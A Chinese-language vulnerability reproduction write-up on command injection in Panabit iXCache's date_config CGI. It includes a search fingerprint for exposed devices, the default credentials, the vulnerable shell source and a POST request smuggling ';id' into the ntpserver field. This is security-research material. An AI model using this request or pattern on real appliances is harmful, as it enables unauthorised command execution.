# Panabit iXCache date_config 后台命令执行漏洞

## 漏洞描述

Panabit iXCache date_config模块存在命令拼接，导致可执行任意命令

## 漏洞影响

<a-checkbox checked>Panabit iXCache </a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="iXCache"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1628866761666-5daacae5-6bcd-4792-b8c4-09519ff5df9a.png)

默认账号密码为：**admin/ixcache ,** 存在漏洞的模块为

```php
  /cgi-bin/Maintain/date_config
```

找到请求方式传参可以通过查看登陆页面文件获取, 通过抓包得知验证文件为 **userverify.cgi**

![img](../../../.vuepress/public/img/1628931413593-ce7fc906-a40e-4ebf-9a55-b8e5c23e45a4.png)

接收请求参数的方式如下，通过快速搜索查找可能交互的地方

```php
"${REQUEST_METHOD}" = "POST"
```

![img](../../../.vuepress/public/img/1628931565205-770e4b02-7112-4d6d-bd2f-22cd8ee80dea.png)

这样就可以快速找到可以传参交互的地方，查看的过程发现存在可控点

![img](../../../.vuepress/public/img/1628931751554-2fd5da94-7b54-4933-b6e1-2e4559684e6e.png)

```bash
#!/bin/sh
#This script is created by ssparser automatically. The parser first created by MaoShouyan
printf "Content-type: text/html
Cache-Control: no-cache

"
echo -n ""; 
. ../common/common.sh
myself="/cgi-bin/Maintain/`basename $0`"

echo -n "
<script languate=\"javascript\">
function Validate(frm)
{
	frm.ntpserver.value = TrimAll(frm.ntpserver.value);
	if (frm.ntpserver.value != \"\" && !IsIPAddr(frm.ntpserver.value)) {
		alert(\"请输入IP地址!\");
		frm.ntpserver.select();
		return false;
	}
	return true;
}
</script>
";
if [ "${REQUEST_METHOD}" = "POST" ]; then
	operator_check "${myself}"
	[ "${CGI_ntpserver}" = "" ] && CGI_ntpserver="0.0.0.0"
	echo "ntpserver_ip=${CGI_ntpserver}" > ${PGETC}/ntp.conf
	timefmt="${CGI_year}${CGI_month}${CGI_day}${CGI_hour}${CGI_minute}.${CGI_second}"
	errmsg=`date ${timefmt}`
	[ "${CGI_ntpserver}" != "0.0.0.0" ] && ntpdate -t 10 ${CGI_ntpserver}
	
	afm_dialog_msg "操作成功!"
fi
year=`date "+%Y"`
month=`date "+%m"`
day=`date "+%d"`
hour=`date "+%H"`
minute=`date "+%M"`
second=`date "+%S"`
if [ -f ${PGETC}/ntp.conf ]; then
	. ${PGETC}/ntp.conf
	CGI_ntpserver="${ntpserver_ip}"
fi
[ "${CGI_ntpserver}" = "" ] && CGI_ntpserver="0.0.0.0"

echo -n "
<body>
"; cgi_show_title "系统管理->系统时间" 
echo -n "
<br>
<form method=post onsubmit=\"return Validate(this)\" action=\"${myself}\">
<table width=700 border=0 cellspacing=1 cellpadding=1 bgcolor=\"#ffffff\">
<tr id=row1 height=22>
	<td width=40></td>
	<td width=90 align=left>NTP服务器</td>
	<td width=* align=left>
		<input type=text name=ntpserver style=\"width:120px\" value=\"${CGI_ntpserver}\"></input>&nbsp;(请输入IP地址，目前不支持域名解析,0.0.0.0表示关闭NTP)</td>
</tr>
</table>
<br>
<table width=700 border=0 cellspacing=1 cellpadding=1 bgcolor=\"#ffffff\">
<tr id=row1 height=22>
	<td width=40></td>
	<td width=90 align=left>年/月/日</td>
	<td width=* align=left>
	<select name=year style=\"width:60px\" value=${year}>
	";
		tmpvar=2000
		while [ ${tmpvar} -le 2020 ]; do
			if [ ${tmpvar} -eq ${year} ]; then
				echo "<option value=${tmpvar} selected>${tmpvar}</option>"
			else
				echo "<option value=${tmpvar}>${tmpvar}</option>"
			fi
			tmpvar=$((${tmpvar} + 1))
		done
	
echo -n "</select>年
	<select name=month style=\"width:60px\" value=${month}>
	";
		tmpvar=1
		while [ ${tmpvar} -le 12 ]; do
			selected=""
			[ ${tmpvar} -eq ${month} ] && selected="selected"
			if [ ${tmpvar} -lt 10 ]; then
				echo "<option value=\"0${tmpvar}\" ${selected}>${tmpvar}</option>"
			else
				echo "<option value=\"${tmpvar}\" ${selected}>${tmpvar}</option>"
			fi
			tmpvar=$((${tmpvar} + 1))
		done
	
echo -n "</select>月
	<select name=day style=\"width:60px\" value=${day}>
	";
		tmpvar=1
		while [ ${tmpvar} -le 31 ]; do
			selected=""
			[ ${tmpvar} -eq ${day} ] && selected="selected"
			if [ ${tmpvar} -lt 10 ]; then
				echo "<option value=\"0${tmpvar}\" ${selected}>${tmpvar}</option>"
			else
				echo "<option value=\"${tmpvar}\" ${selected}>${tmpvar}</option>"
			fi
			tmpvar=$((${tmpvar} + 1))
		done
	
echo -n "</select>日</td>
</tr>
<tr id=row1>
	<td></td>
	<td align=left>时/分/秒</td>
	<td width=* align=left>
	<select name=hour value=0 style=\"width:60px\" value=${hour}>
	";
		tmpvar=0
		while [ ${tmpvar} -le 23 ]; do
			selected=""
			[ ${tmpvar} -eq ${hour} ] && selected="selected"
			if [ ${tmpvar} -lt 10 ]; then
				echo "<option value=\"0${tmpvar}\" ${selected}>${tmpvar}</option>"
			else
				echo "<option value=\"${tmpvar}\" ${selected}>${tmpvar}</option>"
			fi
			tmpvar=$((${tmpvar} + 1))
		done
	
echo -n "</select>时
	<select name=minute value=0 style=\"width:60px\" value=${minute}>
	";
		tmpvar=0
		while [ ${tmpvar} -le 59 ]; do
			selected=""
			[ ${tmpvar} -eq ${minute} ] && selected="selected"
			if [ ${tmpvar} -lt 10 ]; then
				echo "<option value=\"0${tmpvar}\" ${selected}>${tmpvar}</option>"
			else
				echo "<option value=\"${tmpvar}\" ${selected}>${tmpvar}</option>"
			fi
			tmpvar=$((${tmpvar} + 1))
		done
	
echo -n "</select>分
	<select name=second value=0 style=\"width:60px\" value=${second}>
	";
		tmpvar=0
		while [ ${tmpvar} -le 59 ]; do
			selected=""
			[ ${tmpvar} -eq ${second} ] && selected="selected"
			if [ ${tmpvar} -lt 10 ]; then
				echo "<option value=\"0${tmpvar}\" ${selected}>${tmpvar}</option>"
			else
				echo "<option value=\"${tmpvar}\" ${selected}>${tmpvar}</option>"
			fi
			tmpvar=$((${tmpvar} + 1))
		done
	
echo -n "</select>秒</td>
</tr>
</table>
<table style=\"width:700; border-bottom:1px #787882 solid; color:#0000ff\">
<tr><td align=right>&nbsp;</td></tr>
</table>
<table style=\"width:700\"> 
<tr>
        <td align=right><input type=submit style=\"width:70\" value=\"提交\"></input>
	<input type=hidden name=ifname value=\"fxp1\"></input></td>
</tr>
</table>
</form>
</table>
</center>
</body>
</html>
";
```

![img](../../../.vuepress/public/img/1628931891389-0549f9d3-8e94-4a25-b32c-79c350808160.png)

**${CGI_ntpserver} 参数可以发现，受用户可控**

![img](../../../.vuepress/public/img/1628931980080-7302ea8c-e306-49ac-a4ad-3a93ac8d2724.png)

主要位置注意这个代码位置

```bash
echo "ntpserver_ip=${CGI_ntpserver}" > ${PGETC}/ntp.conf
```

**这里将参数写入 ${PGETC}/ntp.conf 文件，查看文件位置，看一下变量 ${PGETC} 配置**

![img](../../../.vuepress/public/img/1628932135524-80885cc7-ec0c-4c70-9145-3c92bbeb92c2.png)

在 /etc 目录下找到了这个文件

![img](../../../.vuepress/public/img/1628932193427-d571379b-0d7e-44ce-8005-6d077e69df02.png)

继续向下看

![img](../../../.vuepress/public/img/1628932309063-96a9127b-56b3-4dd7-bb51-09cf825c01bd.png)

可以发现当 ntp.conf 文件中写入其他参数就会造成命令执行，思路如下

![img](../../../.vuepress/public/img/1628932750956-a0ee7056-7ccd-4cb3-a4df-9a5ad61b7c00.png)

构造请求

```php
POST /cgi-bin/Maintain/date_config

ntpserver=0.0.0.0;id&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1
```

![img](../../../.vuepress/public/img/1628933229066-f8d6c653-898f-4ca4-811e-6d9ee9f9e528.png)

**成功写入 ntp.conf 文件为 0.0.0.0;id, 再次访问该页面就可以获取命令执行结果**

![img](../../../.vuepress/public/img/1628933214110-726666cf-d57e-4ccc-91e2-72a5d93bb27e.png)



交互处可进行命令拼接造成注入

![img](../../../.vuepress/public/img/1628866823919-229f07f4-6805-40ce-bc7b-46c33387e40a.png)